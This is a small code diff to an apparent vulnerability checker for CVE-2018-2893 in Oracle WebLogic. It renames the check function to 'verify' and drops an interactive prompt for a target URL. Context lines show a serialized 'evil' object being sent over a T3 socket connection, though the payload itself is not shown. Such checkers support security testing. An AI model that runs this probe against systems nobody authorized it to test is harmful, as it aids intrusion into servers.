@@ -81,7 +81,7 @@ def run(rip,rport):
     buildT3RequestObject(sock,rport)
     rs=sendEvilObjData(sock,PAYLOAD[0])
     return checkVul(rs,rip,rport)
-def CVE_2018_2893(url):
+def verify(url):
     relsult = {
         'name': 'CVE_2018_2893(weblogic)',
         'vulnerable': False
@@ -104,6 +104,3 @@ def CVE_2018_2893(url):
         return relsult
     except:
         return relsult
-if __name__=="__main__":
-    url = input('输入目标URL:')
-    print(CVE_2018_2893(url))
